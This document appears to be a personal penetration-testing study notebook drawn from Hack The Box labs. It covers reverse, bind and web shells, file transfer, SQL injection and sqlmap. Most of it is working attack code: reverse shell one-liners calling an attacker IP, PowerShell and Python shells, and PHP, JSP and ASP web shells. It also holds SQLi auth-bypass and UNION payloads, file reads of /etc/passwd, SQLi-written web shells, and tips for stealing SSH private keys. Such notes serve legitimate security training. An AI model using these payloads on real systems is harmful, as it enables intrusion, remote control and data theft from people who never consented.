💡 ***In essence, both commands above aim to achieve the same goal: establishing a reverse shell connection to a remote host. The second command is more complex and involves the use of named pipes and the*** ***`cat` command for communication between the shell process and the `nc` process. The choice of which command to use might depend on the specific context, the tools available on the target system and the preferences of the person executing the command.***


**IMPORTANT ❗️**

---

It is important to adapt the reverse shell code to the language you are dealing with. For ex the nibble machine in HTB we were dealing with PHP and so we leveraged **payloadallThings** or others to find the correct format for the reverse shell. as such the command below becomes:

`<? php system (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 1234 >/tmp/f"); ?>`

---

Code: powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```


Once connection is established, we should get the following:

```
Eli90@htb[/htb]$ nc -lvnp 1234listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


💡 ***NOTICE IN REVERSE SHELL, WE USE TARGET **PORT**  WITH **ATTACKER’S IP*****


## Bind Shell

A bind shell will listen on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`, to that port.

**pros**

- if connection is lost, we can connect back to it and get another connection

**cons**

- if bind shell command is stopped access will be lost

- if host is rebooted, access will be lost

**difference with reverse shell**

💡 From what I have noticed, the main diff is see how on a reverse shell you have to find your IP address and specify it when setting up a listener with nc on port 1234, you conect back to it and specify your own IP address


**STEPS TO IMPLEMENT:**

**1 - start a bind shell**

Code: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

```

Code: python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

```

Code: powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

```


💡 ***NOTE: typically, IP address is set to 0.0.0.0 so that we can connect to it from anywhere*** ***Note that form the commands above, only the python script has the IP 0.0.0.0 specified. So I am assuming the others dont need it?***

❗️ **IP 0.0.0.0** has a special meaning in networking:

0.0.0.0 is referred to as an "unspecified" or "wildcard" address. It does not specifically represent a single device on a network but is used in different contexts:

1. **Listening on All Network Interfaces**: When a network service or application binds to the IP address "0.0.0.0," it is indicating that it is willing to listen for incoming connections on all available network interfaces or IP addresses on the system. In this case, the service is not tied to any specific IP address.
2. **Routing and Default Route**: In some networking contexts, "0.0.0.0" can represent the default route, which is used by routers to indicate that they should route packets to the best matching destination based on other routing table entries.
3. **Configuration**: In network configuration, "0.0.0.0" might be used as a placeholder or wildcard value, indicating that the configuration applies to all available IP addresses or interfaces.
4. **Subnetting**: In the context of subnetting, using "0.0.0.0" for the subnet mask indicates the entire IP address space, not a specific subnet.

**2 - Connect to the port where we set up the shell to wait for us:**

```
Eli90@htb[/htb]$ nc 10.10.10.1 1234id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And we are dropped into a bash session automatically.

## TTY (Upgrading terminal)

In order to be able to move cursor, use arrows and such.  There are multiple ways to do this, among which:

`python -c 'import pty; pty.spawn("/bin/bash")'`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:

`www-data@remotehost$ ^ZEli90@htb[/htb]$ stty raw -echoEli90@htb[/htb]$ fg[Enter]
[Enter]
www-data@remotehost$`

Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset`
 and hit enter to bring it back. At this point, we would have a fully
working TTY shell with command history and everything else.

more options [here](https://academy.hackthebox.com/module/77/section/725)

## Web Shell

A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

**pros**

- bypasses firewall restriction in place

- will not open a new connection on port but run on web (80, 880 or 443, or wtv)

- If rebooted, connection will still persists

**cons**

- shell obtained is not as interactive as we have to request a new url for  each command (although can be automated with a python script)

**STEPS TO IMPLEMENT**

**1 - Write a web shell**

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

```

Code: asp

```
<% eval request("cmd") %>

```

**2 - Upload the web Shell**

Once we have our web shell, we need to place our web shell script into
the remote **host's web directory (webroot)** to execute the script through
the web browser. This can be through a vulnerability in an upload
feature, which would allow us to write one of our shells to a file, i.e.
 `shell.php` and upload it, and then access our uploaded file to execute commands.

However if we dont have an upload feature and only access is through an exploit, we can write the shell directly to the webroot. as such:

**(for apache server)**

`echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`

The following are the default webroots for common web servers:

| Web Server | Default Webroot |
| --- | --- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

**3 - accessing it**

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:

in the browser address, type ⇒ *http://SERVER_IP:PORT/shell.php?cmd=**id***

OR use **cURL**

```
curl http://SERVER_IP:PORT/shell.php?cmd=**id**

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **USEFUL LINKS 🔗**

- Link dump

[Hacktricks](https://book.hacktricks.xyz)

[Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)

- Enumeration Scripts:

**Linux**

[LinEnum](https://github.com/rebootuser/LinEnum.git)

[LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker)

**Windows**

[Seatbelt](https://github.com/GhostPack/Seatbelt)

[JAWS](https://github.com/411Hall/JAWS)

- Server Enumeration

[PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

Note that these scripts are noisy and might trigger antivirus

- Reach root with sudo:

Linux  [GTFOBins](https://gtfobins.github.io/)

Windowns [LOLBAS](https://lolbas-project.github.io/#)

# **QUICK LINUX CHEATSHEET 💡**

`dpkg -l`    see what software is instaled on system

`sudo ip link set <interface-name> down` switch a network interface down (ETH OR OTHER)

`sudo -l`  Check which privileges we have

`sudo su -`  switch user to **root**

`sudo su <user name>`  switch to another user

`chmod 600 <file>`  change the file's permissions to be more restrictive

`ls -l file.txt`  Read permissions on a file

APPEND TO A FILE

`echo "new content" >> filename`

OR

`echo "new content" | tee -a filename`

# **SSH 🔐**

## What is it:

Which stands for **Secure Shell**

💡  ***Check if you have read access to /root/.ssh folder (or any other user /<user name>/.shh)***


**If you have read permission** to the root folder, (check using command `ls -l <file-name>`) then read their  hidden  ********.ssh******** folder and read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`

# **TRANSFERING FILES  📬**

**Transfer files TO and FROM a remote**

FIRST! Run a Python HTTP server where the file is living from (HOST if you are sending a file to remote / REMOTE if you are grabbing a file from remote…)

`python3 -m http.server 8000`  is the standard command to start a server.

Example of output:

```
**Eli90@htb[/htb]$** cd /tmp
**Eli90@htb[/htb]$** python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

In the example above we have started a server at 0.0.0.0 (whch remember  0.0.0.0 is referred to as an "unspecified" or "wildcard" address.)

and then on the remote we can download a file like so:

## Wget

`wget http://<your-IP-address (ATTACKER>:8000/linenum.sh`

## cUrl

`curl http://<HOST-IP>/linenum.sh -o linenum.sh`

***Note that we used the `-o` flag to specify the output file name.***

## SCP

💡 ***you can only use this if you have obtained ssh user credentials on the remote host***

`scp linenum.sh user@remotehost:/tmp/linenum.sh`

***Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.***

## Base64

**In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine**

In this case, the solution is to (1) ************************base64************************ encode the file in the attacker file —> (2) copy the encoded contain —> (3) paste and decode it in the remote

commands:

- (1)   `base64 shell -w 0`

```
**Eli90@htb[/htb]$** base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

- (2) … pretty self explanatory right?

- (3) `echo <paste encoded contain here> | base64 -d > shell`

`**user@remotehost$** echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

**Validate file integrity after transfer!**

- Check the file type is still the same

With the `file`  command:

```
**user@remotehost$** file shell

shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

- Check its md5 hash is the same on both remote and host:

With `md5sum` command:

```
**Eli90@htb[/htb]$** md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

# **CeWL 🔐**

## What is it:

(Pronounced COOL)

Custom Word List generator.

CeWL is a ruby app which spiders a given URL to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.

See [Github repo](https://github.com/digininja/CeWL)

# **SQLi  💉**

## What is it:

A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.

**Impact**

 - Retrieve secret/sensitive information that should not be visible to us, like user logins and passwords or credit card information
 - Subvert the intended web application logic. The most common example of this is bypassing login without passing a valid pair of username and password credentials

## SQL Basics

***The following is executed on a MySQL DB***

* Log into a MySQL DB Server :

`mysql -u root -p`  ( or `mysql -u root -p<password>` but should be avoided because password will stay in the history logs)

Log in and specify a remote host and port using the `-h` and `-P` flags.

`mysql -h <taget> -P <port-target> -u root -p`

* commands:

ceate a db
`create database <db-name>`

Specify which db we are using
`use <db-name>`

See all existing dbs
`show databases`

see all tables (Once you have selected a db to use)
`show tables`

Create a table:

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

```

***INSERT (**C**RUD)***

* In all columns

`INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);`

* in specific columns

`INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);`

* multiple values in specific columns

`INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');`

***SELECT (C**R**UD)***

* Select all columns in a dable

`SELECT * FROM table_name;`

* Select specific columns in a table

`SELECT column1, column2 FROM table_name;`


***💡 To see a table schema, use `DESCRIBE <table name>`***


***DROP (CRU**D**)***

* Delete a table

`DROP TABLE  <tablename>`

* Delete a column

`ALTER TABLE logins DROP oldColumn;`



***ALTER (CR**U**D)***


***💡 While `ALTER` is used to change a table's properties, the [UPDATE](https://dev.mysql.com/doc/refman/8.0/en/update.html) statement can be used to update specific records within a table under certain conditions***


* add  a column

`ALTER TABLE logins ADD newColumn INT;`

* Rename a col

`ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;`

* Change data type

`ALTER TABLE logins MODIFY oldColumn DATE;`

***UPDATE (CR**U**D)***

***💡 While `ALTER` is used to change a table's properties, the [UPDATE](https://dev.mysql.com/doc/refman/8.0/en/update.html) statement can be used to update specific records within a table under certain conditions***

* Update a table under certain conditions

`UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;`


## Type of Injections

### In-Band SQLi

**What is it:**

The output of both the intended and the new query may be printed directly on the front end, and we can directly read it.

- Union based: where we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there.

- Error based: where when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query

### Blind

**What is it:**

Here we are not getting the output printed, so we may utilize SQL logic to retrieve the output character by character.

- Boolean based: Where we can use SQL conditional statements to control whether the page
returns any output at all, 'i.e., original query response,' if our
conditional statement returns `true`

- Time based: Where we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function

### Out-of-band

**What is it:**

in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.

## Performing an SQLi

### 1 - Test for vulnerability

Add one of the following after the username to see if it causes errors:

| Payload | URL Encoded |
| --- | --- |
| ' | %27 |
| " | %22 |
| # | %23 |
| ; | %3B |
| ) | %29 |

***💡 Sometimes we might have to use the URL encoded version of the payload. For example when when we put the payload directly in the URL 'i.e. HTTP GET request'.***

### 2 - Auth Bypass

* with ***OR***

Most frequent payload will be:

 `OR '1'='1`

 Might need to comment out the rest of the query with `--` or `#`. Try all combinations.

***💡 See more SQLi auth bypass payloads at [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)***


The goal is to return a `TRUE` response. See logic in the below diagram

![Untitled]()


***💡 ADDITIONALLY, to log in as a specific user the payload `<user>’ OR ‘1’=’1` (with nothing in the password field) worked where having the query in both USERNAME and PWD fields didnt… something to keep in mind … I guess this work if you can keep the pwd field empty? (no validation)***

* With ***UNION***

As seen on Hackerone and solution offered by [this kind article](https://hacker101.testerting.science/micro-cms_v2/flag0/), one can bypass Auth with a `Union` clause like this:

Username field:

`' UNION SELECT '123' AS password#`

Password field:

`123`

### 3 - DB Enumeration

Example of a UNION query in a SQLi vulnerable field:

`SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '`

The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases

**❗️UNION statement requirements**

- **A `UNION` statement can only operate on `SELECT` statements with an equal number of columns**

A work around for this is selecting Junk data to match the number of column of the union stmt we want to work with lol like so:

`SELECT 1 from passwords`

Which will always return 1 as the output

or

`SELECT "junk" from passwords`

which will always return “Junk”

- **The data types of the selected columns on all positions should be THE SAME.**

A work around is simply use `NULL` to fill other columns as NULL fits all data types

**3(a) Find how many columns**

**With ORDER BY**

To find out how many columns we have, use **`ORDER BY`** for example `order by 3` . If you get an error, then it means there are 2 columns
(If you prev didnt get an error at `order by 2`)

**With UNION**

The other method is to attempt a Union injection with a different number of columns until we successfully get the results back

Example:

`UNION select 1,2,3--`

***💡 The first method always returns the results until we hit an error, while this method always gives an error until we get a success.***

Also make sure to specify a location to output the result of your query!


**(3b) Find out which db we are in**

Wild guess (starting point, note that many other DB can run on these OSs)

Apache, Nginx ⇒ Linux ⇒ mySQL

IIS ⇒ Microsoft dbms ⇒ MSSQL


| Payload | When to Use | Expected Output | Wrong Output |
| --- | --- | --- | --- |
| SELECT @@version | When we have full query output | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' | In MSSQL it returns MSSQL version. Error with other DBMS. |
| SELECT POW(1,1) | When we only have numeric output | 1 | Error with other DBMS |
| SELECT SLEEP(5) | Blind/No Output | Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS |

* **INFORMATION_SCHEMA***

contains metadata about the databases and tables present on the server.

* **SCHEMATA**

This table is located in the **information_schema** db and contains information about all databases on the server. The `SCHEMA_NAME` column contains all the database names currently present

Example of enumration:

`UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA--`

```
The following 3 dbs will always be present in MySQL DBs because they are default (sometimes there is a fourth one called 'sys')

**| mysql              |
| information_schema |
| performance_schema |**
```


***💡 `database()` will tell you what is the **current db** we are in***


**(3c) find out TABLES  present in the db**

the `TABLES` table in the `INFORMATION_SCHEMA` db Contains information about all tables throughout the database. In this table, we will most likely be interested in `TABLE_SCHEMA` and `TABLE_NAME` columns.

example:

`UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--`



**(3d) find out COLUMNS present in the db**

The `COLUMNS` table in the `INFORMATION_SCHEMA` db contains information about all columns present in all the databases. Here we will most likely be interested in the The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns

Example

`UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--`


### 4 - Privilege escalation

First, let’s find out our current privileges.

Typically in a SQL db you would run to find out what privileges you have.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

```

We can accomplish the same with our `UNION` injection. As such:

`cn' UNION SELECT 1, user(), 3, 4-- -`

or

`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`

**- Find out if we have super privileges:**

You ll get the info with:

`SELECT super_priv FROM mysql.user`

or

`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`


***💡 You can add `WHERE user="root"-- -` if there are a lot of users in the db***

The output of this query will be `Y` if user has super_priv

**- Find out if we can READ/WRITE:**

You ll get this info with:

`UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

Where `FILE` is the action that interest us in the event we are looking to manipulate files.

From there, we can find out if we can:

**READ FILES**

`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

***💡 We will only be able to read the file if the OS user running MySQL has enough privileges to read it.***


We can even read source code for the web app:

`UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

and `ctrl + u` to view it as code.

**WRITE FILE**

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

- Check if `secure_file_priv` is NOT enabled:

`secure_file_priv` is used to determine where to read/write files from.

**An empty value** ⇒ Can read files from the entire file system

**Null** ⇒ we cannot read/write from any directory

**Enabled** ⇒ Limited to certain files ?


***💡 MariaDB has this variable set to empty by default if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder.***

find out with the command:

`SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`

- If we indeed have write access to the target, you can write using the following command:

`SELECT * from users INTO OUTFILE '/tmp/credentials';`

Then go see it with: `cat /tmp/credentials`

Write a file:

`SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

and go see it at `cat /tmp/test.txt';`

***💡 the `test.txt` file was created successfully and is owned by the `mysql` user.***

### 5 - Writing a web shell with SQLi

**Note**:
To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations.

Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).

Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that we may write to.

**Write the shell into the server**

Using a `union` injection payload, I would craft the following statement to write anything into the server:

`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

Now if I want to start a shell, replacing ‘file written successfully!” with

**`<?php system($_REQUEST[0]); ?>`**

So now we have:

**`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`**

I have had instances where the code above didnt work. Instead I used:

`' UNION SELECT "",'<?php system(pwd); ?>',"","","" INto outfile '/var/www/html/dashboard/shell.php'-- -`

This ☝️ doesnt  give you remote execution per say but you are passing the command in the `<?php system(ENTER COMMAND HERE); ?>` and you then navigate to `url/shell.php` to see the output. Not very efficient I know lol ... but as you will find out, if there are no requirement of stealth or spead or efficiency only the result matters 😁

You can pass other commands like:

`' UNION SELECT "",'<?php system(dir /); ?>',"","","" INto outfile '/var/www/html/dashboard/shell5.php'-- -`

that will ist the content of `\`. When you see the doc that interests you, grab it with `LOAD_FILE`

***Tip:***

If the attack is successful, this is how you navitgate a web shell:

```
http://<Address>/shell2.php?0=ls

http://<Address>/shell2.php?0=pwd

http://<Address>/shell2.php?0=ls /var/www/html

http://<Address>/shell2.php?0=cat /var/www/flag.txt
```

## Mitigation

Injection can be avoided by sanitizing any user input, rendering injected queries useless.

There are Libraries to help you escape special characters. Libraries like:

[mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)

[pg_escape_string()](https://www.php.net/manual/en/function.pg-escape-string.php)


# **SQLMap 🛠**

## What is it:

penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.

## How to use:

`sqlmap -u "<URL>" --batch`

option `-u` is used to provide the target URL, while the switch `--batch` is used for skipping any required user-input, by automatically choosing using the default option.

**Deconstructing the output**

```
Eli90@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 22:26:45 /2020-09-09/

[22:26:45] [INFO] testing connection to the target URL
[22:26:45] [INFO] testing if the target URL content is stable
[22:26:46] [INFO] **target URL content is stable [1 - see notes]**
[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
[22:26:46] [INFO] **GET parameter 'id' appears to be dynamic [2]**
[22:26:46] [INFO] **heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL') [3]**
[22:26:46] [INFO] **heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks**
[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y **[4]**
[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:26:46] [WARNING] **reflective value(s) found and filtering out [5]**
[22:26:46] [INFO] **GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther") [6]**
[22:26:46] [INFO] testing 'Generic inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
...SNIP...
[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[22:26:46] [INFO] testing 'MySQL inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
...SNIP...
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:26:56] [INFO] target URL appears to have 3 columns in query
[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---
[22:26:56] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'

[*] ending @ 22:26:57 /2020-09-09/
```

[1] - means no major changes between responses when sending identical request: This is good for automation

[2] - means a change in this parameter would result in a change of the output

[3]

[4] This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.

[5] a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk

[6] This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding

…

**SQLMap on an HTTP Request**

**web request with parameters inside**

**EASIEST** ⇒ Get the URL using inspect/network tab and copy as cURL

then craft the request as below:

`sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`

there has to be either a parameter value that could be assessed for
SQLi vulnerability or specialized options/switches for automatic
parameter finding (e.g. `--crawl`, `--forms` or `-g`)



When dealing with **POST** requests, one can craft a request as this:

`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`

Where parameters `uid` and `name` will be tested for SQLi vulnerability


***💡 if we are sure for example, that  parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`  OR Specify with a `*` like this: `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`***


And then for **PUT** requests, we can use the `--method` switch as follow:

`sqlmap -u www.target.com --data='id=1' --method PUT`

**Sending FULL request**

(If we need to specify lots of things in the request like heards, cookies, etc. It also helps when dealing with Json  bodies)

1- intercept the request of interest in Burp,save it to file

2- start the test with `-r` with —

`sqlmap -r req.txt`

**HANDLING ERRORS**

Use `-parse-erros` switch to display error when the program runs, `-v` to display as much info as possible and `-t <file/path>`  to store traffic for better examination.

---

**Running SQLMap on an HTTP Request exercises:**

 - Detect and exploit SQLi vulnerability in POST parameter `id`

`sqlmap -u "94.237.59.185:32382/case2.php" --data 'id=1' --batch --dump`

 - Detect and exploit SQLi vulnerability in Cookie value `id=1`

`sqlmap sqlmap -u http://94.237.59.206:52596/case3.php --cookie="id=*" --batch --dump`

(will also work with one sqlmap hmm)

 - Detect and exploit SQLi vulnerability in JSON data `{"id": 1}`

***💡 Need to capture a request in burpsuite for this!!!***

`sqlmap -r req.txt --batch --dump`

**Info on switches:**

- `--batch` is defined in the command, the tool uses a default value to proceed without asking the user.

- `--dump` will tell SQLmap to grab all the data from the  table and display it (Noice eh?)

- One is doing a permanent delete of the session (`--flush-session`),

- the other is ignoring the session (`--fresh-queries`). You should not use them together because it doesn't make any sense to do that

- `--crawl` Lets Sqlmap look for parameters to inject

- `--parse-errors`  parse the DBMS errors (if any) and displays them as part of the program run

- `-t /tmp/traffic.txt`   (or any file name of your choosing) - This will store all sent and received HTTP requests in the specified file.

- `-v` Verbosity option
